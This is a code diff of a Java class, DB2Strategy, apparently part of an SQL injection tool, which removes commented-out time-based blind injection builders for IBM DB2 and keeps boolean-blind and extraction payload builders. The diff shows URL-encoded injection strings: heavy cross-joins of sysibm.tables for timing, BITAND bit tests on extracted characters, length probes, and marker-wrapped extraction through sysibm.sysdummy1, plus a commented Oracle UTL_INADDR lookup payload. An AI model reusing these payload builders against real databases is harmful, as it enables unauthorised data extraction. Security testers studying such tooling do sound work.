@@ -88,23 +88,6 @@ public class DB2Strategy extends ASQLStrategy {
         return "+and+length(" + inj + ")>" + indexCharacter + "--+";
     }
     
-//    @Override
-//    public String timeCheck(String check) {
-//        return "+and(SELECT+count(*)FROM+sysibm.tables,sysibm.tables,sysibm.tables)>0+and+not(" + check + ")--+";
-//    }
-//
-//    @Override
-//    public String timeBitTest(String inj, int indexCharacter, int bit) {
-////        return "+union+select+CASE+WHEN+0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + ")+then''else+UTL_INADDR.get_host_name('10.0.0.1')END+from+dual--+";
-//        return "+and(SELECT+count(*)FROM+sysibm.tables,sysibm.tables,sysibm.tables)>0+and+not(0!=BITAND(ascii(substr(" + inj + "," + indexCharacter + ",1))," + bit + "))--+";
-//    }
-//
-//    @Override
-//    public String timeLengthTest(String inj, int indexCharacter) {
-////        return "+union+select+CASE+WHEN+length(" + inj + ")>" + indexCharacter + "+then''else+UTL_INADDR.get_host_name('10.0.0.1')END+from+dual--+";
-//        return "+and(SELECT+count(*)FROM+sysibm.tables,sysibm.tables,sysibm.tables)>0+and+not(length(" + inj + ")>" + indexCharacter + ")--+";
-//    }
-
     @Override
     public String blindStrategy(String sqlQuery, String startPosition) {
         return
@@ -118,19 +101,6 @@ public class DB2Strategy extends ASQLStrategy {
                 "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
     }
 
-//    @Override
-//    public String timeStrategy(String sqlQuery, String startPosition) {
-//        return
-//            "(select+" +
-//                /**
-//                 * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
-//                 */
-//                "varchar(replace('SQLi'||substr(" +
-//                    "(" + sqlQuery + ")," +
-//                    startPosition +
-//                "),'SQLi%01%03%03%07','SQLi'))+from+sysibm.sysdummy1)";
-//    }
-    
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
         return
@@ -153,7 +123,6 @@ public class DB2Strategy extends ASQLStrategy {
                  * repeat gets internal table size error on blind 'where 1=1'
                  * => uses rpad instead
                  */
-//                "varchar('SQLi$1'||repeat('%23',1024)||'iLQS')"
                 "varchar('SQLi$1'||rpad('%23',1024,'%23')||'iLQS',1024)"
             );
     }
